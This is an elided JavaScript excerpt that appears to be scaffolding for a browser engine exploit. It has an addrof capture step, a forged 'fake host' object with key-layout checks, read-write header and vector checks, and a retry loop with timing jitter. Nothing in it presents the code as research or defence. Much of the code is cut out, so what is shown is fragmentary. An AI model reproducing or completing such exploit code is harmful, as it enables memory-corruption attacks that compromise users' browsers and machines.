...
let attemptCaptureMs = CAPTURE_DELAY_MS;
let attemptComposeMs = COMPOSE_DELAY_MS;
...
function releaseAttemptAllocations() {
    ...
    for (let pass = 0; pass < 2; ++pass) {
        ...
        try {
            if (typeof ArrayBuffer === "function") { /* keep shape stable */ }
        } catch { }
    }
}

async function releaseAttemptAllocationsAsync() {
    releaseAttemptAllocations();
    const spins = (function () {
        try {
            const q = new URLSearchParams(location.search).get("gcyield");
            if (q !== null) {
...
function scheduleSafeRetry(reason) {
    ...
    const retBaseMs = (function () {
        try {
            const q = new URLSearchParams(location.search).get("retryms");
            const n = q ? parseInt(q, 10) : 0;
            if (n >= 1 && n <= 60000) return n;
        } catch (e) { }
        return 750;
    })();
    const backoffGrowth = (function () {
        try {
            const q = new URLSearchParams(location.search).get("backoff");
            if (q !== null) {
                const n = parseInt(q, 10);
                if (n >= 0 && n <= 8) return n;
            }
    ...
    retryWaitMs = Math.min(30000,
        Math.round(retBaseMs * (1 + backoffGrowth * (attemptNumber - 1))));
    emit("AUTO-RETRY-SCHEDULED", `reason=${reason}-next-attempt=${nextAttempt}`
        + `-wait-ms=${retryWaitMs}`);
    releaseAttemptAllocationsAsync();
    setTimeout(() => {
...
function startAttempt() {
    ...
    stopped = false;
    resetAttemptState();
    const jitterPct = (function () {
        try {
            const q = new URLSearchParams(location.search).get("jitter");
            if (q !== null) {
                const n = parseInt(q, 10);
    ...
    attemptCaptureMs = CAPTURE_DELAY_MS;
    attemptComposeMs = COMPOSE_DELAY_MS;
    if (jitterPct > 0 && attemptNumber > 1) {
        const step = ((attemptNumber - 1) % 5) - 2;      // -2..+2
        attemptCaptureMs = Math.max(0, Math.round(
            CAPTURE_DELAY_MS * (1 + (step * jitterPct) / 100)));
        attemptComposeMs = Math.max(0, Math.round(
            COMPOSE_DELAY_MS * (1 + (step * jitterPct) / 100)));
    }
    try {
    ...
    emit("ATTEMPT-START", `attempt-persisted=${attemptPersisted}`
        + `-capture-ms=${attemptCaptureMs}-compose-ms=${attemptComposeMs}`
...
function buildFakeHost() {
    ...
    const hostKeys = Object.keys(fakeHost);
    if (hostKeys.length !== 3
        || hostKeys[0] !== "q0" || hostKeys[1] !== "q2" || hostKeys[2] !== "q3")
        throw new Error("fake-host-delete-layout-failed");
    ...
    const holderKeys = Object.keys(targetHolder);
    const wantHolder = ["q0", "q1", "q2", "q3", "q4", "q5"];
    if (holderKeys.length !== wantHolder.length)
        throw new Error("probe-holder-dense-failed");
    for (let i = 0; i < wantHolder.length; ++i) {
        if (holderKeys[i] !== wantHolder[i])
            throw new Error("probe-holder-order-failed");
    }
}
...
function prepareAddrof() {
    ...
    emit("ADDROF-WRAPPER-READY", `wait=${attemptCaptureMs}ms`);

    setTimeout(runAddrofCapture, attemptCaptureMs);
    setTimeout(beginComposition, attemptComposeMs);
}
...
function loadHistoryCritical() {
    ...
    try {
        ...
        if (!rwHeaderOK) {
            ...
            const headerIsJunk = !rwHeaderOK;
            retrySafe = headerIsJunk && !rwVectorTouched
                && !candidateMutationStarted;
            candidate = null;
            clearPredecessor();
            compositionState = 3;
...
function reportComposition() {
    ...
    if (compositionState === 3) {
        const headerJunkMiss = !rwHeaderOK && retrySafe && !zeroHeaderMiss;
        emit(identityResult === -1 ? "CARRIER-IDENTITY-FAIL"
            : (zeroHeaderMiss ? "ZERO-HEADER-MISS"
                : (headerJunkMiss ? "HEADER-JUNK-MISS"
        ...
        if (!retrySafe)
            ...
            scheduleSafeRetry(zeroHeaderMiss ? "zero-header-miss"
                : headerJunkMiss ? "header-junk-miss"
